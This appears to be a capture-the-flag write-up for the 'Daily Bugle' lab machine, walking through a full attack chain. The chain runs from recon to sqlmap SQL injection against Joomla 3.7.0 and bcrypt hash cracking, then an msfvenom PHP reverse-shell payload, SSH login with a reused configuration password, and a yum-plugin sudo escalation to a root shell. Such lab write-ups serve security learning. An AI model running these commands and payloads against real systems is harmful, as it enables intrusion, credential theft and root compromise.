# what I learned
- SQLmap is slow AF, max thread is 10....
- Exploiting Joomla version 3.7.0
- GTFObins yum
# enumerate
- 22/tcp   open  ssh
- 80/tcp   open  http
  - robot.txt
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
  - /administrator/ admin login
  - /README.txt joomla version

- 3306/tcp open  mysql


* gobuster
```
/LICENSE.txt (Status: 200)
/README.txt (Status: 200)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/cli (Status: 301)
/components (Status: 301)
/configuration.php (Status: 200)
/htaccess.txt (Status: 200)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/templates (Status: 301)
/tmp (Status: 301)
```
I found out that the server is running Joomla 3.7.0 (from README.txt) and there is a exploit for this version [ExploitDB](https://www.exploit-db.com/exploits/42033)

# foothold
The vulnerability on Joomla 3.7.0 allow attacker to run SQLi attack. The plan is we will using `sqlmap` to fetch all database on the victem server. We might find a admin credential for Joomla which allow us to log in to `/administrator`

First let fetch the databaeses:
```console
$ sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
*
*
*
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```
The most interesting database in this case is joomla, let hope that it will contain a credential that allow us to login to the admin page. to list the table in database we run:
```console
$ sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables --threads 10
```
There are many table in joomla database. but if you look closely you will find `#__users` which looks interesting for us.. Lets dump the mentioned table and hope that we will get a Joomla admin credential. 
```console
$ sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump --threads 10
```
Bing go ! There is one user in the table which is `jonah` and he is admin on Joomla. let crack his password hash using hashcat (3200 bcrypt)
```console
$ hashcat -m 3200 -a 0 -o crack.txt '$2y$<hash>' /usr/share/wordlists/rockyou.txt --force
```
Now, log in to `/administrator`. If you wanna know in depth how to get reverse shell by exploiting Joomla admin panel, read [here](Daily-Bugle.md).

let start with generate the payload using msfvenom
```console
msfvenom -p php/meterpreter/reverse_tcp lhost=tun0 lport=1234 R
```
now open msfconsole and use multi/handler, run it. to execute our payload, visite this page `/templates/beez3/error.php`. You should get a meterpreter shell at this point.

from meterpreter, drop to shell and spawn a tty shell by run
```python -c 'import pty; pty.spawn("/bin/sh")'```

let enumerate a bit.
```console
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$ pwd
pwd
/var/www/html
sh-4.2$ cat configuration.php
public $password = '<password>';
sh-4.2$ ls /home
ls /home
jjameson
sh-4.2$ cd /home/jjameson
cd /home/jjameson
sh: cd: /home/jjameson: Permission denied
```

# user
this is what we know:
- we cant sudo coz we dont know the `apache`'s password. 
- a password in `configuration.php`
- there is a user call `jjameson`
- no premisson to access `jjameson` files

Remember our nmap? port 22 ssh is open, let ssh as `jjameson` using the password we found in `configuration.php`. BOOM we are in again !! Grab user flag.


recon... again...
```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

# root
As you can see, we can run `yum` as root. So what do we do? like always. go to [GTFObins](https://gtfobins.github.io/gtfobins/yum/#sudo). Prefecto, There is two way to do it, 
1. It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target. how to do it? read [here](https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/)
2. Spawn interactive root shell by loading a custom plugin. how to do it? just run the command that shown in GTFObins

I should to go with 2nd opion:
```console
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cat /root/root.txt
```


